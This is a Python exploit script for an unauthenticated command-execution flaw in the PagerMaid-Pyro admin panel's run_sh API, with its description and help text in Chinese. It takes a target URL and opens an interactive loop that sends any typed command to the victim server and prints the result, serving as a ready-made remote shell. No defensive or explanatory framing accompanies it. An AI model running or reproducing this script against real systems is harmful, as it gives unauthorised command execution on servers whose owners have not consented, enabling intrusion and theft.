import requests
import argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parse = argparse.ArgumentParser(description="PagerMaid-Pyro后台管理系统 run_sh 未授权命令执行")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    args = parse.parse_args()
    check(args.url)

def check(domain):
    if 'http' not in domain:
        domain=f"http://{domain}"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
    }
    while 1:
        command=input(">>")
        url=f"{domain}/pagermaid/api/run_sh?cmd={command}"
        response=requests.get(url=url,headers=headers,verify=False,timeout=3)
        print(response.text)
if __name__ == '__main__':
    main()